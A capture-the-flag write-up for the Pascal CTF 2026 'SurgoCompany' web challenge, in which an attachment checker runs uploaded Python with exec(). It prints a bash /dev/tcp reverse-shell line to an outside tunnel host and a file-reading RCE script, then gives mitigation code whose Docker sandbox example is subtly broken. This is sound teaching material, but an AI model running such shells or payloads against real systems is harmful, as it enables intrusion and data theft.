# Pascal CTF 2026

# SurgoCompany

## Web: RCE, LFI

## Description
SurgoCompany™ has just launched a brand-new online Customer Service platform 🧩. The system is still under development, and you've been asked to test it 😈. Simply enter your email, describe your issue, and optionally upload a file related to your problem 🤨.

The source code of the challenge is saved somewhere on the filesystem... and rumor has it that a file named flag.txt is hiding in that very same folder 😜.

Can you find a way to read it?

Email box: https://surgo.ctf.pascalctf.it  
Email account generator: https://surgoservice.ctf.pascalctf.it

## Files
> src.py (Server netcat functionality source code)

---

## Analysis

We can see a Gmail-like web interface and a server deployed with Netcat. Every time we connect to it using `nc [address] [port]` in the Linux terminal, an email is sent to a supposed company complaint inbox that uses this email service. When we accessed it, the terminal displayed that we had approximately 2 minutes to access the email and respond to the complaint, with the option to attach a file if desired.

```bash
     ___                        ___                                              
    / __\ _ _  _ _  ___  ___   /  _\  ___  _ _ _  ___  ___  _ _  _ _                
    \__ \| | || '_>/ . |/ . \  | |__ / . \| ' ' || . \<_> || ' || | |
    /___/\___||_|  \_. |\___/  \___/ \___/|_|_|_||  _/<___||_|_|\_  |
                   <___/                         |_|            <___/
     ___          _       _                       ___   _  _             _    _
    | . | ___ ___<_> ___<| |> ___  _ _  ___ ___  /  _\ | |<_> ___  _ _ <| |> <_>
    |   |<_-<<_-<| |<_-< | | / ._>| ' | / /<_> | | |__ | || |/ ._>| ' | | |  | |
    |_|_|/__//__/|_|/__/ |_| \___\|_|_|/___<___| \___/ |_||_|\___\|_|_| |_|  |_|
                                                                                
    Our customer support system is currently under development.
    In the meantime, you can contact us about your problem via email.
    We are waiting for your reply... (approximately 60 minutes maximum wait)
```

```
Your reply has been received!

Checking attachment '/tmp/tmpzlhxctj7/solution.py'...
====================================================================================================
```

Whenever we uploaded a file, we could see it being uploaded to a temporary folder that gets deleted after processing. Looking at the provided `src.py` source code, we identified a very weak security check that can be easily bypassed. The dangerous part is that the server executes the code to check for malicious scripts, which is a critical security flaw. This creates a race condition where we can execute code and retrieve the flag.

```python
def check_attachment(filepath):
    if filepath is None:
        return False

    print(f"Checking attachment '{filepath}'...")

    # Read the attachment content
    # If it can't be read, then it can't be executable code
    try:
        with open(filepath, "r") as f:
            content = f.read()
    except Exception as e:
        print("The attachment passed the security check.")
        print(f"Error: {e}")
        return

    # Execute the attachment's code
    # If it raises an error, then it's not executable code and therefore not dangerous
    try:
        exec(content)
        print("The attachment did not pass the security check.")
        print("Removing the attachment...")

    except Exception as e:
        print("The attachment passed the security check.")
        print(f"Error: {e}")
```

We tested various approaches including reverse shells but found they weren't viable. First attempts with Python spawning a shell:

```python
import pty
print("=" * 100)
print("[+] Executing reverse shell")
pty.spawn("/bin/bash")
```

Then attempts with bash binary reverse shells, including tunneling through Pinggy (an ngrok-like service), but the connection was closed:

```bash
bash -c 'bash -i >& /dev/tcp/ikvbp-2a02-6ea0-c10d-5484--15.a.free.pinggy.link/39833 0>&1'
```

Therefore, we need to execute commands that complete before the `exec()` function kills our script.

---

## Theory

To solve this challenge you need to understand:
- **BASH connections**
- **Regex**
- **Linux bash commands**
- **Basic networking**
- **LFI (Local File Inclusion)**
- **RCE (Remote Code Execution)**
- **Patience** ;)

---

## Solution

### Step 1: Initial Reconnaissance and Vulnerability Identification
First, we call the Netcat server which sends us an email to the complaint system. We can respond via email (like Gmail) with the added capability of attaching a malicious script. As we identified in the analysis, we need to execute our commands before `exec()` terminates our script.

### Step 2: Bypassing the Time Constraint Using the `find` Command Cache
After testing various approaches, we discovered we need to leverage the `find` command's caching mechanism. Here's an important observation: the `find` command has a type of cache or memory - the first time we search for something, it takes longer to display results, but subsequent searches are much faster.

Knowing this, we need to execute an initial `find` command in our script to "warm up" the cache:

```python
import os

print("=" * 100 + "\n")
print("Exec command find\n")
cmd_find = "find / -name 'flag.txt' 2>/dev/null"
print(f"[+]: {cmd_find}")
archivos_encontrados = os.popen(cmd_find).read().strip().split('\n')
print(archivos_encontrados[0])
```

This refreshes the cache/memory and provides us with the file paths.

### Step 3: Exploiting the RCE to Read the Flag
With the cache warmed up, we need to ensure two things:
1. The `cat` command isn't blocked (we use `strings` as a backup)
2. We iterate through all found files to read each `flag.txt`

Our final exploit script (`solution.py`):

```python
import os

print("=" * 100 + "\n")
print("Exec command find\n")
cmd_find = "find / -name 'flag.txt' 2>/dev/null"
print(f"[+]: {cmd_find}")
archivos_encontrados = os.popen(cmd_find).read().strip().split('\n')
print(archivos_encontrados[0])

path = archivos_encontrados[0]

read_comand = "cat " + archivos_encontrados[0]

reading = os.popen(read_comand)
print(reading.read())

for path in archivos_encontrados:
    print(path)
    print(os.popen("cat " + path).read())
    print("With strings")
    print(os.popen("strings " + path).read())
```

The output from the Netcat bot shows successful execution with the flag retrieved twice (once with `cat` and once as backup with `strings`):

```bash
Your reply has been received!

Checking attachment '/tmp/tmpzlhxctj7/solution.py'...
====================================================================================================

Exec command find

[+]: find / -name 'flag.txt' 2>/dev/null
/app/flag.txt
pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}

/app/flag.txt
pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}

With strings

The attachment did not pass the security check.
Removing the attachment...

The request will be forwarded to our support team.
We will contact you as soon as possible, goodbye!
```

**MACHINE PWNED!** :)

---

## Flag
> **pascalCTF{ch3_5urG4t4_d1_ch4ll3ng3}**

---

## How to avoid

To prevent Remote Code Execution (RCE) vulnerabilities like this, implement the following comprehensive security measures:

### 1. **Never Execute User-Supplied Code**
The fundamental flaw in this challenge is using `exec()` on user-controlled input. This is one of the most dangerous practices in software development.

**Secure alternatives:**
- Use static analysis tools instead of dynamic execution
- Implement file type validation based on magic bytes, not execution
- Use sandboxed environments with strict resource limits if execution is absolutely necessary

```python
# INSECURE - Never do this
exec(user_content)

# SECURE - Use static analysis
import ast

def validate_python_syntax(content):
    """Safely check if content is valid Python without executing it"""
    try:
        ast.parse(content)
        return True, "Valid Python syntax"
    except SyntaxError as e:
        return False, f"Invalid syntax: {e}"
```

### 2. **Implement Proper File Upload Validation**
Use a multi-layered approach to validate uploaded files:

```python
import magic
import os
from pathlib import Path

ALLOWED_EXTENSIONS = {'.txt', '.pdf', '.png', '.jpg', '.jpeg'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def secure_file_validation(filepath):
    """
    Comprehensive file validation without executing content
    """
    path = Path(filepath)
    
    # 1. Extension allowlist (not blocklist)
    if path.suffix.lower() not in ALLOWED_EXTENSIONS:
        return False, f"File type {path.suffix} not allowed"
    
    # 2. File size check
    if os.path.getsize(filepath) > MAX_FILE_SIZE:
        return False, "File too large"
    
    # 3. Magic byte verification (actual file type)
    mime = magic.from_file(filepath, mime=True)
    allowed_mimes = {
        'text/plain',
        'application/pdf',
        'image/png',
        'image/jpeg'
    }
    
    if mime not in allowed_mimes:
        return False, f"MIME type {mime} not allowed"
    
    # 4. Content scanning (antivirus/malware detection)
    # Integrate with ClamAV or similar
    
    return True, "File passed all security checks"
```

### 3. **Use Sandboxing and Containerization**
If you must execute user code, isolate it completely:

```python
import subprocess
import tempfile
import os

def execute_in_sandbox(code, timeout=5):
    """
    Execute code in isolated container with strict limits
    """
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(code)
        temp_path = f.name
    
    try:
        # Execute in Docker container with:
        # - No network access
        # - Limited CPU/memory
        # - Read-only filesystem
        # - Temporary execution environment
        result = subprocess.run(
            [
                'docker', 'run',
                '--rm',
                '--network=none',
                '--memory=128m',
                '--cpus=0.5',
                '--read-only',
                '--tmpfs', '/tmp:rw,noexec,nosuid,size=64m',
                'python:3.9-alpine',
                'python', '/tmp/script.py'
            ],
            timeout=timeout,
            capture_output=True,
            text=True
        )
        return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return None, "Execution timeout"
    finally:
        os.unlink(temp_path)
```

### 4. **Implement Proper Input Validation and Sanitization**
```python
import re
from typing import Optional

def validate_email(email: str) -> bool:
    """Validate email format"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))

def sanitize_text_input(text: str, max_length: int = 5000) -> Optional[str]:
    """Sanitize text input to prevent injection attacks"""
    if not text or len(text) > max_length:
        return None
    
    # Remove null bytes
    text = text.replace('\x00', '')
    
    # Strip dangerous characters for file operations
    dangerous_patterns = [
        r'\.\.',  # Directory traversal
        r'[\x00-\x1f\x7f-\x9f]',  # Control characters
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, text):
            return None
    
    return text
```

### 5. **Apply the Principle of Least Privilege**
```python
import os
import pwd
import grp

def drop_privileges(user='nobody', group='nogroup'):
    """
    Drop root privileges to minimal user
    Run application with minimum necessary permissions
    """
    if os.getuid() != 0:
        # Not running as root, nothing to drop
        return
    
    # Get the uid/gid from the name
    running_uid = pwd.getpwnam(user).pw_uid
    running_gid = grp.getgrnam(group).gr_gid
    
    # Remove group privileges
    os.setgroups([])
    
    # Set new uid/gid
    os.setgid(running_gid)
    os.setuid(running_uid)
    
    # Ensure privileges cannot be restored
    os.umask(0o077)
```

### 6. **Implement Comprehensive Logging and Monitoring**
```python
import logging
from datetime import datetime

# Configure structured logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security.log'),
        logging.StreamHandler()
    ]
)

def log_security_event(event_type, details, severity='WARNING'):
    """Log security-relevant events for monitoring"""
    logging.log(
        getattr(logging, severity),
        f"SECURITY EVENT: {event_type} | Details: {details} | Timestamp: {datetime.utcnow().isoformat()}"
    )

# Example usage
log_security_event(
    event_type="FILE_UPLOAD_REJECTED",
    details={"reason": "Invalid MIME type", "user": "user@example.com"},
    severity="WARNING"
)
```

### 7. **Use Security Headers and Rate Limiting**
Implement protection at the application level:

```python
from flask import Flask, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# Rate limiting to prevent abuse
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.after_request
def set_security_headers(response):
    """Set security headers on all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response

@app.route('/upload', methods=['POST'])
@limiter.limit("5 per minute")
def upload_file():
    # Handle file upload with rate limiting
    pass
```

### Example Secure Implementation:

```python
import os
import magic
import tempfile
from pathlib import Path
from typing import Tuple, Optional

class SecureFileHandler:
    """Secure file upload and processing handler"""
    
    ALLOWED_EXTENSIONS = {'.txt', '.pdf', '.png', '.jpg'}
    MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
    ALLOWED_MIMES = {
        'text/plain',
        'application/pdf',
        'image/png',
        'image/jpeg'
    }
    
    def __init__(self, upload_dir: str = '/secure/uploads'):
        self.upload_dir = Path(upload_dir)
        self.upload_dir.mkdir(parents=True, exist_ok=True)
        
        # Ensure directory has proper permissions
        os.chmod(self.upload_dir, 0o750)
    
    def validate_file(self, filepath: str) -> Tuple[bool, str]:
        """
        Comprehensive file validation
        Returns: (is_valid, message)
        """
        path = Path(filepath)
        
        # 1. Extension check (allowlist)
        if path.suffix.lower() not in self.ALLOWED_EXTENSIONS:
            return False, f"Extension {path.suffix} not allowed"
        
        # 2. Size check
        if os.path.getsize(filepath) > self.MAX_FILE_SIZE:
            return False, "File exceeds maximum size"
        
        # 3. MIME type verification
        try:
            mime = magic.from_file(filepath, mime=True)
        except Exception as e:
            return False, f"Could not determine file type: {e}"
        
        if mime not in self.ALLOWED_MIMES:
            return False, f"MIME type {mime} not allowed"
        
        # 4. Additional content validation (no execution!)
        # For text files, check for suspicious patterns without executing
        if mime == 'text/plain':
            if not self._validate_text_content(filepath):
                return False, "Text content failed security checks"
        
        return True, "File is valid"
    
    def _validate_text_content(self, filepath: str) -> bool:
        """
        Validate text content without executing it
        """
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read(10000)  # Read only first 10KB
            
            # Check for suspicious patterns (not blocklist, just warnings)
            suspicious_patterns = [
                'exec(', 'eval(', '__import__',
                'subprocess', 'os.system'
            ]
            
            for pattern in suspicious_patterns:
                if pattern in content:
                    # Log but don't necessarily reject
                    log_security_event(
                        "SUSPICIOUS_CONTENT",
                        {"pattern": pattern, "file": filepath}
                    )
            
            return True
        except Exception:
            return False
    
    def process_upload(self, file_content: bytes, filename: str) -> Tuple[bool, str, Optional[str]]:
        """
        Securely process an uploaded file
        Returns: (success, message, saved_path)
        """
        # Create temporary file for validation
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp.write(file_content)
            tmp_path = tmp.name
        
        try:
            # Validate the file
            is_valid, message = self.validate_file(tmp_path)
            
            if not is_valid:
                return False, message, None
            
            # Generate safe filename
            safe_filename = self._generate_safe_filename(filename)
            final_path = self.upload_dir / safe_filename
            
            # Move to secure location
            os.rename(tmp_path, final_path)
            os.chmod(final_path, 0o640)  # Read/write for owner, read for group
            
            return True, "File uploaded successfully", str(final_path)
            
        except Exception as e:
            return False, f"Upload failed: {e}", None
        finally:
            # Clean up temp file if it still exists
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
    
    def _generate_safe_filename(self, filename: str) -> str:
        """Generate a safe filename preventing path traversal"""
        # Remove any directory components
        safe_name = os.path.basename(filename)
        
        # Remove dangerous characters
        safe_name = "".join(c for c in safe_name if c.isalnum() or c in '._-')
        
        # Add timestamp to prevent collisions
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        name, ext = os.path.splitext(safe_name)
        
        return f"{name}_{timestamp}{ext}"

# Usage example
handler = SecureFileHandler()
success, message, path = handler.process_upload(file_bytes, "user_upload.txt")
if success:
    print(f"File saved securely at: {path}")
else:
    print(f"Upload rejected: {message}")
```

### References:
- [OWASP Code Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Code_Injection_Prevention_Cheat_Sheet.html)
- [OWASP File Upload Security](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [NIST Secure Coding Practices](https://www.nist.gov/itl/ssd/software-quality-group/secure-coding)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
